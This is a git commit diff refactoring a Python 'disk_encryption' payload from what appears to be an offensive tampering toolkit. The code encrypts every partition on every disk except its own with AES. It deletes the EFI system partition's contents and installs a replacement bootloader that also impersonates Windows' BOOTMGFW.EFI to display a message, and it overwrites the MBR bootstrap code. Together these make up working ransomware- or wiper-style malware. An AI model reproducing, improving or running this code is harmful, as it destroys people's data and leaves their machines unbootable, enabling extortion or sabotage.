cdc23e215ec15fbb8f2923abe97f522a8c19ba9c
Kamyar <139503563+GlobularOne@users.noreply.github.com>
2024-07-15 12:47:16 +0330

    tampering/disk_encryption: Major improvements

--- snr/payloads/tampering/disk_encryption/payload.py
+++ snr/payloads/tampering/disk_encryption/payload.py
@@ -1,20 +1,15 @@
+#!/usr/bin/python3
 """
+Disk_encryption payload
 """
-
-import os
-import shutil
-
 from Crypto.Cipher import AES
 
-from snr.core.payload import context, entry_point, storage
-from snr.core.util import common_utils, programs
+from snr.core.payload import entry_point, storage
+from snr.core.util import common_utils
 
 KEY = "@KEY@".encode()
 IV = "@IV@".encode()
 MESSAGE = "@MESSAGE@"
-
-FS_MOUNTPOINT = "/mnt"
-EFI_DIRECTORY = f"{FS_MOUNTPOINT}/EFI"
 
 
 def encrypt_device(info: storage.BlockInfo) -> None:
@@ -36,56 +31,39 @@ def encrypt_device(info: storage.BlockInfo) -> None:
 
 @entry_point.entry_point
 def main() -> None:
-    block_info = storage.query_all_block_info()
-    # We don't care about LVM
+    block_info, _, our_device = storage.setup(no_lvm=True)
     common_utils.print_info("Disk_encryption payload started")
-    ctx = context.create_context_for_mount_point("/")
-    if ctx is None:
-        common_utils.print_error("Creating context for / failed")
-        return None
-
-    our_device = storage.get_partition_root(ctx.device_name, block_info)
-    if our_device is None:
-        common_utils.print_error("Finding partition root device for / failed")
-        return None
-
     with open("/root/bios_disk_encryption_message.bin", "rb") as stream:
         bios_payload = stream.read()
 
     for device in block_info:
         if device != our_device:
             for child in device.children:
-                # Mount it to see if it's the ESP or not
-                errorcode = programs.Mount().invoke_and_wait(
-                    None, child.path, FS_MOUNTPOINT)
-                if errorcode != 0:
-                    common_utils.print_info(
-                        f"Failed to mount '{child.path}'! Assuming it's not the ESP")
-                    # Encrypt it anyway, because, encrypting the ESP is better
-                    # than not encrypting a possible data partition
-                    encrypt_device(child)
-                    continue
-                if os.path.exists(EFI_DIRECTORY) and len(os.listdir(EFI_DIRECTORY)) != 0:
-                    if not os.path.exists("/mnt/boot") and not os.path.exists("/mnt/Windows"):
-                        common_utils.print_info("Installing to ESP")
-                        shutil.rmtree(EFI_DIRECTORY)
-                        os.makedirs(f"{EFI_DIRECTORY}/BOOT")
-                        shutil.copy("/root/BOOTX64.EFI",
-                                    f"{EFI_DIRECTORY}/BOOT/BOOTX64.EFI")
-                        with open(f"{EFI_DIRECTORY}/BOOT/message.txt", "w",
-                                  encoding="utf-8") as stream:
-                            stream.write(MESSAGE)
-                        os.mkdir(f"{EFI_DIRECTORY}/Microsoft")
-                        shutil.copy("/root/BOOTX64.EFI",
-                                    f"{EFI_DIRECTORY}/Microsoft/BOOTMGFW.EFI")
-                        with open(f"{EFI_DIRECTORY}/Microsoft/message.txt", "w",
-                                  encoding="utf-8") as stream:
-                            stream.write(MESSAGE)
-                        programs.Umount().invoke_and_wait(None, FS_MOUNTPOINT)
-                        continue
+                try:
+                    with storage.mount_partition(child.path, no_luks=True) as mounted_part:
+                        if mounted_part.exists("efi") and len(mounted_part.listdir("efi")) != 0:
+                            if not mounted_part.exists("boot") and not mounted_part.exists("Windows"):
+                                common_utils.print_info("Installing to ESP")
+                                mounted_part.rmtree("efi", ignore_errors=True)
+                                mounted_part.rmtree("EFI", ignore_errors=True)
+                                mounted_part.makedirs("EFI/BOOT")
+                                mounted_part.copy(
+                                    "/root/BOOTX64.EFI", "efi/BOOT/BOOTX64.EFI")
+                                with mounted_part.open("EFI/BOOT/message.txt", "w",
+                                                       encoding="utf-8") as stream:
+                                    stream.write(MESSAGE)
+                                mounted_part.mkdir("EFI/Microsoft")
+                                mounted_part.copy(
+                                    "/root/BOOTX64.EFI", "EFI/Microsoft/BOOTMGFW.EFI")
+                                with mounted_part.open("EFI/Microsoft/message.txt", "w",
+                                                       encoding="utf-8") as stream:
+                                    stream.write(MESSAGE)
+                                continue
+                except RuntimeError:
+                    pass
                 # Not the ESP
-                programs.Umount().invoke_and_wait(None, FS_MOUNTPOINT)
                 encrypt_device(child)
+            # Now device, not partition
             # Overwrite MBR bootstrap area
             # But not the whole MBR for two reason:
             # 1. If there is going to be a recovery, this saves the partition table
@@ -97,7 +75,6 @@ def main() -> None:
                 stream.write(b"\x55\xAA")
 
     common_utils.print_ok("Disk_encryption payload completed")
-    return None
 
 
 if __name__ == "__main__":
